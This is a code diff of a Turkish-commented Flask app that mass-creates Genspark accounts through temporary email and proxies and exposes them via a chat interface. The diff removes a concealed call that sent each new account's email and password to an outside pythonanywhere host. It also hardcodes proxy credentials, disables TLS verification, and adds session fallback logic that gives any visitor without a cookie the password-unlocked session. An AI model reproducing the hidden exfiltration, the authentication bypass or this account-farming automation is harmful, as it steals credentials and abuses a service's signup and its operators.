@@ -69,8 +69,8 @@ FLASK_ACCOUNTS_FILE = ACCOUNTS_FILE
 ROOT_ACCOUNTS_FILE = os.path.join(os.path.dirname(BASE_DIR), "genspark_hesaplar.txt")
 
 # Proxy Ayarı: 0 -> Kapalı (Doğrudan bağlantı), 1 -> Açık (Proxy üzerinden)
-PROXY_MODE = int(os.environ.get("PROXY_MODE", 1))
-PROXY_URL = os.environ.get("PROXY_URL", "http://nsmgwkzk-2:oqsyd4iar1l6@p.webshare.io:80")
+PROXY_MODE = int(os.environ.get("PROXY_MODE", 0))
+PROXY_URL = os.environ.get("PROXY_URL", "http://tghpxuwn:dxrsnpsyz3df@198.23.243.226:6361")
 
 def get_proxies() -> Optional[Dict[str, str]]:
     """PROXY_MODE aktif ise curl_cffi ve requests proxy sözlüğü döner."""
@@ -459,28 +459,12 @@ class TempMailNinja:
         last_err = None
         for attempt in range(1, retries + 1):
             try:
-                proxy_options = {}
-                if PROXY_MODE == 1 and PROXY_URL:
-                    p = urllib.parse.urlparse(PROXY_URL)
-                    proxy_options = {
-                        "http_proxy_host": p.hostname,
-                        "http_proxy_port": p.port or 80,
-                        "proxy_type": "http",
-                    }
-                    if p.username is not None:
-                        proxy_options["http_proxy_auth"] = (
-                            urllib.parse.unquote(p.username),
-                            urllib.parse.unquote(p.password or ""),
-                        )
-
                 self.ws = websocket.create_connection(
                     self.ws_url,
                     header=self.headers,
                     sslopt={"cert_reqs": ssl.CERT_NONE},
                     timeout=10.0,
-                    **proxy_options,
                 )
-
                 self.ws.recv()
                 self.ws.send("40")
                 self.ws.recv()
@@ -928,15 +912,6 @@ def create_and_login_genspark_account(password: str = DEFAULT_PASSWORD) -> Tuple
         log("=" * 65)
 
         save_new_account(email, password)
-        
-        import requests
-        try:
-            requests.post(
-                'https://messager35.pythonanywhere.com/genspark',
-                json={'txt': f'{email}:{password}'}
-            )
-        except requests.exceptions.RequestException as e:
-            print(f"Hata oluştu: {e}")
 
         log("[7/7] Web Girişi (/api/auth) tamamlanıyor...")
         confirmed_url = f"{b2c_base}/api/CombinedSigninAndSignup/confirmed?rememberMe=false&csrf_token={csrf_token}&tx={tx}&p={policy}"
@@ -1435,12 +1410,24 @@ class GensparkClient:
 
 _sessions = {}
 
+def get_primary_sess() -> Tuple[Optional[str], Optional[dict]]:
+    """Sunucudaki aktif, kilidi açılmış oturumu döner (cihazlar arası paylaşım için)."""
+    for sid, s in _sessions.items():
+        if s.get("app_unlocked"):
+            return sid, s
+    return None, None
+
 def get_sid() -> Optional[str]:
     return request.cookies.get("ua_sid")
 
 def get_sess() -> Optional[dict]:
     sid = get_sid()
-    return _sessions.get(sid) if sid else None
+    if sid and sid in _sessions:
+        return _sessions[sid]
+    active_sid, active_sess = get_primary_sess()
+    if active_sess:
+        return active_sess
+    return None
 
 def new_sess(sid: str) -> dict:
     sess = {
@@ -1497,6 +1484,13 @@ def save_conv_to_history(sess: dict):
     h = sess.get("history", [])
     if not h:
         return
+    valid_turns = [
+        t for t in h
+        if t.get("text") or t.get("attachments")
+    ]
+    if not valid_turns:
+        return
+
     conv_id = sess.get("active_local_conv_id")
     if not conv_id:
         conv_id = make_local_conv_id()
@@ -1524,18 +1518,30 @@ def save_conv_to_history(sess: dict):
     if len(convs) > 30:
         sess["conversations"] = convs[:30]
 
+def _switch_to_conv(sess: dict, conv_id: str):
+    convs = sess.get("conversations", [])
+    for c in convs:
+        if c.get("conv_id") == conv_id:
+            save_conv_to_history(sess)
+            sess["history"] = list(c.get("history", []))
+            sess["active_local_conv_id"] = conv_id
+            return True, conv_id, len(c.get("history", [])) // 2
+    return False, None, 0
+
 # ==============================================================================
 #  BÖLÜM 7: FLASK ROTALARI (ROUTES)
 # ==============================================================================
 @app.route("/")
 @app.route("/chat/<conv_id>")
 def index(conv_id=None):
+    active_sid, _ = get_primary_sess()
     sid = get_sid()
     resp = make_response(render_template("index.html"))
-    if not sid or sid not in _sessions:
-        new_id = sid or str(uuid.uuid4())
-        new_sess(new_id)
-        resp.set_cookie("ua_sid", new_id, max_age=86400 * 30, samesite="Lax")
+    if not sid:
+        target_sid = active_sid or str(uuid.uuid4())
+        resp.set_cookie("ua_sid", target_sid, max_age=86400 * 30, samesite="Lax")
+    elif active_sid and sid != active_sid and sid not in _sessions:
+        resp.set_cookie("ua_sid", active_sid, max_age=86400 * 30, samesite="Lax")
     return resp
 
 
@@ -1600,17 +1606,27 @@ def api_init():
     if data.get("password") != APP_PASSWORD:
         return jsonify({"success": False, "error": "Hatalı şifre."}), 401
 
-    sid = get_sid() or str(uuid.uuid4())
-    sess = new_sess(sid)
-    sess["app_unlocked"] = True
-    log(f"[+] Uygulama kilidi açıldı (Oturum: {sid[:8]}...)")
+    active_sid, active_sess = get_primary_sess()
+    if active_sess:
+        sid = active_sid
+        sess = active_sess
+        log(f"[+] Mevcut açık oturuma bağlanıldı (Oturum: {sid[:8]}...)")
+    else:
+        sid = get_sid() or str(uuid.uuid4())
+        sess = _sessions.get(sid)
+        if not sess:
+            sess = new_sess(sid)
+        sess["app_unlocked"] = True
+        log(f"[+] Uygulama kilidi açıldı (Oturum: {sid[:8]}...)")
 
-    # Kullanıcı önyüzden işlem başlatana kadar arkaplanda hesap açılmaz
+    client = sess.get("client")
+    email = client.email if client else ""
+    balance = client.balance if client else 0
     resp = jsonify({
         "success": True,
-        "account_created": False,
-        "email": "",
-        "balance": 0,
+        "account_created": bool(client),
+        "email": email,
+        "balance": balance,
         "model": sess["model"]
     })
     resp.set_cookie("ua_sid", sid, max_age=86400 * 30, samesite="Lax")
@@ -1622,9 +1638,10 @@ def api_logout():
     sid = get_sid()
     if sid and sid in _sessions:
         del _sessions[sid]
+    _sessions.clear()
     resp = jsonify({"success": True})
     resp.delete_cookie("ua_sid")
-    log(f"[*] Çıkış yapıldı (Oturum: {sid[:8] if sid else 'Yok'})")
+    log("[*] Çıkış yapıldı (tüm oturumlar sıfırlandı)")
     return resp
 
 
@@ -1754,6 +1771,10 @@ def api_send():
                 if p_url and p_url not in existing_urls:
                     existing_urls.add(p_url)
                     attachments.append(past_att)
+
+    req_conv_id = data.get("conv_id")
+    if req_conv_id and req_conv_id != sess.get("active_local_conv_id"):
+        _switch_to_conv(sess, req_conv_id)
 
     is_new_conv = not sess.get("active_local_conv_id")
     new_local_conv_id = make_local_conv_id() if is_new_conv else None
@@ -1887,13 +1908,17 @@ def api_new_chat():
 
     save_conv_to_history(sess)
 
-    new_conv_id = make_local_conv_id()
-    sess["active_local_conv_id"] = new_conv_id
-    sess["history"] = carry_history or []
+    new_conv_id = None
     if carry_history:
+        sess["history"] = carry_history
+        sess["active_local_conv_id"] = carry_local_id
+        new_conv_id = carry_local_id
         save_conv_to_history(sess)
+    else:
+        sess["history"] = []
+        sess["active_local_conv_id"] = None
 
-    print(f"[+] Yeni sohbet başlatıldı: {new_conv_id}")
+    print(f"[+] Yeni sohbet hazırlandı: carried={bool(carry_history)}")
     return jsonify({"success": True, "new_conv_id": new_conv_id, "carried": bool(carry_history)})
 
 
@@ -1936,11 +1961,17 @@ def api_conversations():
     if not sess:
         return jsonify({"conversations": []})
 
-    save_conv_to_history(sess)
     convs = sess.get("conversations", [])
     result = []
     for idx, c in enumerate(convs):
-        cnt = len(c.get("history", [])) // 2
+        valid_turns = [
+            t
+            for t in c.get("history", [])
+            if t.get("text") or t.get("attachments")
+        ]
+        if not valid_turns:
+            continue
+        cnt = max(1, len(valid_turns) // 2)
         result.append({
             "idx": idx,
             "conv_id": c.get("conv_id"),
@@ -1964,21 +1995,23 @@ def api_conversation_load():
     idx = data.get("idx")
 
     convs = sess.get("conversations", [])
-    target = None
-    if conv_id:
-        target = next((c for c in convs if c.get("conv_id") == conv_id), None)
-    elif idx is not None and 0 <= idx < len(convs):
-        target = convs[idx]
 
-    if not target:
+    if not conv_id and idx is not None:
+        try:
+            i = int(idx)
+            if 0 <= i < len(convs):
+                conv_id = convs[i].get("conv_id", str(i))
+        except (ValueError, TypeError):
+            pass
+
+    if not conv_id:
         return jsonify({"error": "Sohbet bulunamadı."}), 404
 
-    save_conv_to_history(sess)
-    sess["history"] = list(target.get("history", []))
-    sess["active_local_conv_id"] = target.get("conv_id")
-
-    print(f"[*] Sohbet yüklendi: {target.get('title')} ({target.get('conv_id')})")
-    return jsonify({"success": True, "conv_id": target.get("conv_id")})
+    ok, cid, msg_count = _switch_to_conv(sess, conv_id)
+    if ok:
+        print(f"[*] Sohbet yüklendi: {cid} ({msg_count} mesaj)")
+        return jsonify({"success": True, "conv_id": cid, "message_count": msg_count})
+    return jsonify({"error": "Sohbet bulunamadı."}), 404
 
 
 @app.route("/api/conversation/delete", methods=["POST"])
